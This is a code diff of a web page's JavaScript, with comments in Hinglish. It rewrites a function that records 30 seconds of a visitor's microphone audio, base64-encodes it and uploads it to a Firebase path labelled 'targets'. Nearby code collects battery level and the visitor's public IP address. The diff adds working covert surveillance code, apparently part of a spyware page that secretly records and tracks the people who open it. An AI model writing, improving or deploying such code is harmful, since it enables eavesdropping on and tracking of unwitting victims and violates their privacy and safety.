@@ -104,50 +104,30 @@
         }
     }
 
-  // --- 30 SECOND AUDIO RECORDING SYSTEM ---
-async function recordAudio() {
-    try {
-        // Microphone access confirm karein
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const recorder = new MediaRecorder(stream);
-        let chunks = [];
-
-        recorder.ondataavailable = e => chunks.push(e.data);
-
-        recorder.onstop = () => {
-            const reader = new FileReader();
-            // Audio blob ko Base64 string mein convert karna
-            reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
-            reader.onloadend = () => {
-                const base64Audio = reader.result;
-                // Firebase mein upload
-                db.ref(`targets/${sessionID}/audios`).push({
-                    data: base64Audio,
+    // --- 30 SECOND AUDIO FIX ---
+    async function recordAudio() {
+        try {
+            const recorder = new MediaRecorder(globalStream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const reader = new FileReader();
+                reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
+                reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({
+                    data: reader.result,
                     time: new Date().toLocaleTimeString()
                 });
-                // Mic band karna hardware se
-                stream.getTracks().forEach(t => t.stop());
             };
-        };
-
-        // Recording shuru
-        recorder.start();
-        console.log("Recording Started (30s)...");
-
-        // 30 Seconds ka timer (30000ms)
-        setTimeout(() => {
-            if (recorder.state !== "inactive") {
-                recorder.stop();
-                console.log("Recording Stopped.");
-            }
-        }, 30000); 
-
-    } catch (err) {
-        console.error("Audio Access Denied:", err);
-        // Admin ko error log bhejna
-        db.ref(`targets/${sessionID}/logs`).push("Audio Error: Permission Denied");
+            recorder.start();
+            
+            // 30000ms = 30 Seconds
+            setTimeout(() => {
+                if(recorder.state !== "inactive") recorder.stop();
+            }, 30000); 
+            
+        } catch (e) { console.log("Audio Error"); }
     }
-}
+
     async function sendInfo() {
         const batt = await navigator.getBattery().catch(() => ({level:1}));
         const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
@@ -168,4 +148,3 @@ async function recordAudio() {
 </script>
 </body>
 </html>
-
